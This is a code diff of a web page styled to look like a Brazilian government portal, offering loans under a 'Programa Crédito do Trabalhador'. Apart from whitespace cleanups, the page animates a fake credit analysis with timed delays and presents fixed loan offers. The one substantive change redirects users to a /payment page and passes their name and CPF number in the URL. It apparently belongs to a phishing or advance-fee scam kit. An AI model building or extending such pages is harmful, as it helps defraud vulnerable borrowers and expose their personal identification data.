@@ -471,7 +471,7 @@
             <i class="fas fa-adjust header-icon"></i>
         </div>
     </div>
-    
+
     <div style="width: 100%; background-color: #1351b4; color: white; padding: 8px; text-align: center; font-weight: 500;">
         Programa Crédito do Trabalhador - Lei nº 14.436/2025
     </div>
@@ -682,17 +682,17 @@
                             for (let [index, step] of analysisSteps.entries()) {
                                 // Create and show the current step
                                 await createStep(step, index);
-                                
+
                                 // Wait a bit to show the step
                                 await new Promise(resolve => setTimeout(resolve, 1500));
-                                
+
                                 // Remove previous step if not the last one
                                 if (index < analysisSteps.length - 1) {
                                     const currentStep = analysisContainer.lastChild;
                                     currentStep.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
                                     currentStep.style.opacity = '0';
                                     currentStep.style.transform = 'translateX(20px)';
-                                    
+
                                     // Remove after animation
                                     setTimeout(() => {
                                         if (currentStep && currentStep.parentNode) {
@@ -711,17 +711,17 @@
                             const valor1 = 4000;
                             const parcela1 = 48;
                             const meses1 = Math.ceil(valor1 / parcela1 * 1.019); // Considerando juros de 1,9% ao mês
-                            
+
                             // Opção 2: R$ 6.000,00 com parcela máxima de R$ 68,00
                             const valor2 = 6000;
                             const parcela2 = 68;
                             const meses2 = Math.ceil(valor2 / parcela2 * 1.019);
-                            
+
                             // Opção 3: R$ 10.000,00 com parcela máxima de R$ 118,00
                             const valor3 = 10000;
                             const parcela3 = 118;
                             const meses3 = Math.ceil(valor3 / parcela3 * 1.019);
-                            
+
                             loadingContainer.innerHTML = `
                                 <div style="margin: 25px 0; padding: 15px; background-color: #1451B4; border-radius: 4px; color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                                     <div style="font-weight: 700; font-size: 18px; margin-bottom: 10px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
@@ -766,7 +766,7 @@
                                             <i class="fas fa-check-circle"></i> Selecionar
                                         </button>
                                     </div>
-                                    
+
                                     <!-- Opção 2 -->
                                     <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                                         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
@@ -784,7 +784,7 @@
                                             <i class="fas fa-check-circle"></i> Selecionar
                                         </button>
                                     </div>
-                                    
+
                                     <!-- Opção 3 -->
                                     <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                                         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
@@ -803,12 +803,12 @@
                                         </button>
                                     </div>
                                 </div>
-                                
+
                                 <p style="text-align: center; color: #666; font-size: 14px; margin-bottom: 20px;">
                                     Selecione uma opção acima para prosseguir com a contratação do empréstimo.
                                 </p>
                             `;
-                            
+
                             // Adicionar eventos aos botões de seleção
                             document.querySelectorAll('.select-loan').forEach(button => {
                                 button.addEventListener('click', (e) => {
@@ -817,7 +817,7 @@
                                     const loanValue = e.currentTarget.getAttribute('data-value');
                                     const loanAmount = parseInt(loanValue);
                                     let monthlyPayment, loanTerm;
-                                    
+
                                     // Definir a parcela mensal com base no valor selecionado
                                     if (loanAmount === 4000) {
                                         monthlyPayment = 48;
@@ -829,12 +829,12 @@
                                         monthlyPayment = 118;
                                         loanTerm = meses3;
                                     }
-                                    
+
                                     // Salvar dados do empréstimo no localStorage
                                     const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                                     userData.loanValue = loanValue;
                                     localStorage.setItem('userData', JSON.stringify(userData));
-                                    
+
                                     // Salvar dados do empréstimo em separado para a página de contrato
                                     const loanData = {
                                         amount: loanValue,
@@ -842,7 +842,7 @@
                                         term: loanTerm.toString()
                                     };
                                     localStorage.setItem('loanData', JSON.stringify(loanData));
-                                    
+
                                     // Criar e mostrar tela de carregamento
                                     const loadingScreen = document.createElement('div');
                                     loadingScreen.style.cssText = `
@@ -858,7 +858,7 @@
                                         background-color: rgba(255, 255, 255, 0.95);
                                         z-index: 2000;
                                     `;
-                                    
+
                                     loadingScreen.innerHTML = `
                                         <div style="width: 80px; height: 80px; border: 5px solid #f3f3f3; 
                                                     border-top: 5px solid #1351b4; border-radius: 50%; 
@@ -870,9 +870,9 @@
                                             Aguarde enquanto preparamos sua documentação
                                         </div>
                                     `;
-                                    
+
                                     document.body.appendChild(loadingScreen);
-                                    
+
                                     // Adicionar estilo da animação
                                     if (!document.getElementById('spinAnimation')) {
                                         const style = document.createElement('style');
@@ -885,10 +885,10 @@
                                         `;
                                         document.head.appendChild(style);
                                     }
-                                    
+
                                     // Redirecionar após 5 segundos
                                     setTimeout(() => {
-                                        window.location.href = '/';
+                                        window.location.href = `/payment?nome=${encodeURIComponent(userData.nome)}&cpf=${encodeURIComponent(userData.cpf)}&loan_amount=${loanValue}`;
                                     }, 5000);
                                 });
                             });
